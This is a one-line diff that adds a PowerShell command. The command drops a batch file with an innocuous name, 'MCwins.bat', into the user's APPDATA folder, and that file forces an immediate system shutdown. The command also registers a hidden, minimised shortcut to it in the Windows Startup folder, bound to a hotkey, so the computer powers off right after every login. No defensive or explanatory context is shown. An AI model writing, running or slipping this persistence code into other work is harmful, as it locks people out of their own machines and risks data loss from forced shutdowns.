@@ -1,0 +1,1 @@
+powershell -Command "$p = '${env:APPDATA}\MCwins.bat'; '@echo off' + [Environment]::NewLine + 'shutdown /s /f /t 0' | Out-File -FilePath $p -Encoding oem; $w = New-Object -ComObject WScript.Shell; $s = $w.CreateShortcut('${env:APPDATA}\Microsoft\Windows\Start Menu\Programs\Startup\MCwins.lnk'); $s.TargetPath = $p; $s.Hotkey = 'Ctrl+Alt+K'; $s.WindowStyle = 7; $s.Save()"
